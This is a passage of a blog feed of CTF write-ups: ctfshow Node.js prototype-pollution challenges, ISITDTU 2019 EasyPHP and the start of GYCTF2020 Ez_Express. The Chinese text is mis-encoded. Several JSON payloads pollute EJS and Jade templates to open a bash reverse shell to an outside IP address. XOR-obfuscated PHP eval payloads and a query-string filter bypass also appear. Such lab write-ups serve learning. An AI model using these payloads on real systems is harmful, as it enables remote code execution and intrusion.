boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ç™»å½•å¤±è´¥'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè¦å‘ä¸Šæ±¡æŸ“ä¸¤å±‚æ‰è¡Œï¼Œå…¶ä»–çš„éƒ½å’Œä¸Šé¢ä¸€æ ·</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>341</strong></p><p>æ²¡æœ‰apiäº†ï¼Œç›´æ¥ejsçš„rce</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>342ï¼Œ343</strong></p><p>ä¸æ˜¯ejsæ¸²æŸ“æ¨¡ç‰ˆäº†</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205282335944.png"></p><p>æ˜¯jadeæ¸²æŸ“æ¨¡ç‰ˆï¼Œæ‰¾jadeçš„åŸå‹é“¾æ±¡æŸ“rce</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span><span class="token property">"nodes"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>344</strong></p><p>æºç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®æºç æˆ‘ä»¬æ­£å¸¸æƒ…å†µä¸‹éœ€è¦ä¼ <code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>ä½†æ˜¯é¢˜ç›®æŠŠé€—å·å’Œä»–çš„urlç¼–ç ç»™è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ã€‚</p><pre class="line-numbers language-none"><code class="language-none">payload:?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nodejsä¸­ä¼šæŠŠè¿™ä¸‰éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ï¼Œä¸ºä»€ä¹ˆæŠŠctfshowä¸­çš„cç¼–ç å‘¢ï¼Œå› ä¸ºåŒå¼•å·çš„urlç¼–ç æ˜¯%22å†å’Œcè¿æ¥èµ·æ¥å°±æ˜¯%22cï¼Œä¼šåŒ¹é…åˆ°æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFè®°å½•2</title>
      <link href="/posts/210d3ac7.html"/>
      <url>/posts/210d3ac7.html</url>
      
        <content type="html"><![CDATA[<p>BUUç¬¬äºŒä»½</p><span id="more"></span><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rosÃ© will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code></p><p>å…ˆçœ‹è¿™ä¸ªåˆ¤æ–­ï¼Œcount_charså‡½æ•°ç”¨æ³•å¦‚ä¸‹</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>mode</em></td><td align="left">å¯é€‰ã€‚è§„å®šè¿”å›æ¨¡å¼ã€‚é»˜è®¤æ˜¯ 0ã€‚æœ‰ä»¥ä¸‹ä¸åŒçš„è¿”å›æ¨¡å¼ï¼š<br />0 - æ•°ç»„ï¼ŒASCII å€¼ä¸ºé”®åï¼Œå‡ºç°çš„æ¬¡æ•°ä¸ºé”®å€¼1 - æ•°ç»„ï¼ŒASCII å€¼ä¸ºé”®åï¼Œå‡ºç°çš„æ¬¡æ•°ä¸ºé”®å€¼ï¼Œåªåˆ—å‡ºå‡ºç°æ¬¡æ•°å¤§äº 0 çš„å€¼<br />2 - æ•°ç»„ï¼ŒASCII å€¼ä¸ºé”®åï¼Œå‡ºç°çš„æ¬¡æ•°ä¸ºé”®å€¼ï¼Œåªåˆ—å‡ºå‡ºç°æ¬¡æ•°ç­‰äº 0 çš„å€¼<br />3 - å­—ç¬¦ä¸²ï¼Œå¸¦æœ‰æ‰€æœ‰ä½¿ç”¨è¿‡çš„ä¸åŒçš„å­—ç¬¦<br />4 - å­—ç¬¦ä¸²ï¼Œå¸¦æœ‰æ‰€æœ‰æœªä½¿ç”¨è¿‡çš„ä¸åŒçš„å­—ç¬¦</td></tr></tbody></table><p>é‚£ä¹ˆä¸Šè¿°åˆ¤æ–­æ¡ä»¶å°±æ˜¯è¦ä¿è¯ä¼ å…¥çš„æ•°æ®ä¸­æœ‰ä¸å¤šäº13ä¸­ä¸åŒçš„å­—ç¬¦ï¼Œå…ˆä½¿ç”¨phpinfoæŸ¥çœ‹ä¿¡æ¯</p><pre class="line-numbers language-none"><code class="language-none">?.&#x3D;(~%8F%97%8F%96%91%99%90)();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-26">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-26</a> 15.30.06.png)</p><p>å¯ä»¥ä½¿ç”¨scandiræ¥æ‰«ææ–‡ä»¶ï¼Œæ„å»ºpayloadï¼š<code>print_r(scandir(&#39;.&#39;))</code></p><p>ä½¿ç”¨å¼‚æˆ–è„šæœ¬ç”Ÿæˆ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"print_r"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆçš„payloadå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">?.&#x3D;((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å‘ç°è¶…è¿‡äº†13ä¸ªä¸åŒå­—ç¬¦çš„é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡å¼‚æˆ–ç¼©å‡åŸå§‹å­—ç¬¦æ•°é‡</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">now <span class="token operator">=</span><span class="token string">'\'().;_acdinprst'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> now <span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> now<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> now <span class="token punctuation">:</span>            <span class="token keyword">for</span> m <span class="token keyword">in</span> now <span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>k <span class="token keyword">or</span> j<span class="token operator">==</span>m <span class="token keyword">or</span> m<span class="token operator">==</span>k <span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span> <span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j <span class="token operator">+</span> <span class="token string">'^'</span><span class="token operator">+</span> k <span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœä¸­å¯ä¾›æ›¿æ¢çš„å­—ç¬¦æœ‰å¾ˆå¤šï¼ŒæŒ‘å‡ºä¸‰ä¸ªå¥½ç”¨çš„</p><pre class="line-numbers language-none"><code class="language-none">t &#x3D; s^c^ds^0xff&#x3D;0x8cc^0xff&#x3D;0x9c d^0xff&#x3D;0x9bn &#x3D; i^c^di^0xff&#x3D;0x96c^0xff&#x3D;0x9cd^0xff&#x3D;0x9br &#x3D; a^c^pa^0xff&#x3D;0x9ec^0xff&#x3D;0x9cp^0xff&#x3D;0x8f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆå¼‚æˆ–æ—¶å€™å°†ä¸éœ€è¦å¼‚æˆ–çš„å­—ç¬¦ä¸²å¼‚æˆ–0xFFä¸¤æ¬¡å³å¯</p><pre class="line-numbers language-none"><code class="language-none">print_r&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))æœ€ç»ˆpayloadï¼š?.&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è·å¾—æ–‡ä»¶åï¼Œå°è¯•è®¿é—®å‘ç°æ²¡æœ‰æƒé™ï¼Œåªèƒ½ä½¿ç”¨å‡½æ•°è¯»å–<code>readfile(end(scandir(&#39;.&#39;)))</code></p><pre class="line-numbers language-none"><code class="language-none">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; index.php [3] &#x3D;&gt; n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœŸÂ·æœ€ç»ˆpayload</p><pre class="line-numbers language-none"><code class="language-none">?.&#x3D;((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>æœ¬é¢˜è§¦åŠçŸ¥è¯†ç›²åŒºï¼Œä¹–ä¹–å­¦ä¹ node.jså»å’¯</p><p>é¦–å…ˆè¿˜æ˜¯è¦äº†è§£ä¸€ä¸‹node.jsï¼Œé€šä¿—æ„ä¹‰ä¸Šç†è§£å°±æ˜¯javascriptçš„åç«¯ç‰ˆæœ¬ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šè¯­æ³•æ˜¯å’Œjavascriptä¸€æ ·çš„ï¼Œè¿™é‡Œè´´ä¸ªå¤§ä½¬çš„<a href="https://www.cnblogs.com/20175211lyz/p/12659738.html">node.jsç›¸å…³å®‰å…¨é—®é¢˜æ€»ç»“</a>ï¼Œç„¶åå°±æ˜¯è¿™é“é¢˜äº†ï¼Œæ˜¯node.jsçš„åŸå‹é“¾æ±¡æŸ“</p><p><strong>node.jsçš„åŸå‹é“¾æ±¡æŸ“</strong></p><p>åœ¨jsä¸­ä¸‡ç‰©çš†å¯¹è±¡ï¼Œè€Œåœ¨jsæˆ‘ä»¬å¦‚æœæƒ³è¦å®šä¹‰ä¸€ä¸ªç±»çš„è¯å°±éœ€è¦ä½¿ç”¨ç±»ä¼¼äºæ„é€ å‡½æ•°çš„æ–¹å¼æ¥æ„é€ </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç±»ä¸­çš„æ–¹æ³•ä¹ŸåŒæ ·å¯ä»¥å†™åœ¨æ„é€ å‡½æ•°å†…</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿™ä¹ˆå†™çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬æ¯æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œthis.showå‡½æ•°å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œshowæ–¹æ³•å®é™…ä¸Šæ˜¯è¢«ç»‘å®šåœ¨å¯¹è±¡ä¸Šè€Œä¸æ˜¯è¯¥å¯¹è±¡çš„â€œç±»â€ä¸Šã€‚è€Œæˆ‘ä»¬å¸Œæœ›åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡showæ–¹æ³•ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨åŸå‹(<code>prototype</code>)äº†</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>foo<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹<code>prototype</code>æ˜¯ç±»<code>Foo</code>çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨<code>Foo</code>ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„<code>foo</code>å¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰<code>foo.show()</code>æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Foo.prototype</code>æ¥è®¿é—®<code>Foo</code>ç±»çš„åŸå‹ï¼Œä½†<code>Foo</code>å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥<code>__proto__</code>ç™»åœºäº†ã€‚</p><p>ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡<code>foo.__proto__</code>å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">foo<span class="token punctuation">.</span>__proto__ <span class="token operator">==</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰€ä»¥</p><ol><li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li><li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li><li>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶</li></ol><p>é‚£ä¹ˆé—®é¢˜å°±å‡ºåœ¨å¯¹äºjsæ¥è¯´ï¼Œä¸‡ç‰©çš†å¯¹è±¡ï¼Œåªè¦æˆ‘ä»¬ä¸æ–­çš„å‘ä¸Šè®¿é—®<code>__proto__</code>å±æ€§ï¼Œå†å¯¹å…¶ä¸­çš„æŸä¸ªå±æ€§è¿›è¡Œä¿®æ”¹ï¼Œæ€»èƒ½æ‰¾åˆ°ç›¸å¯¹äºæˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„ç±»çš„çˆ¶ç±»ï¼Œæ­¤æ—¶å†æ–°å»ºæˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„ç±»æ—¶å°±è‡ªåŠ¨å¸¦ä¸Šäº†æˆ‘ä»¬ä¿®æ”¹çš„å†…å®¹</p><p>ä»¥ä¸Šå…¨æ˜¯çŸ¥è¯†ï¼Œæ­£å¼å¼€å§‹åšé¢˜</p><p>é¦–å…ˆå°±æ˜¯è¿™ä¸ª</p><p><img 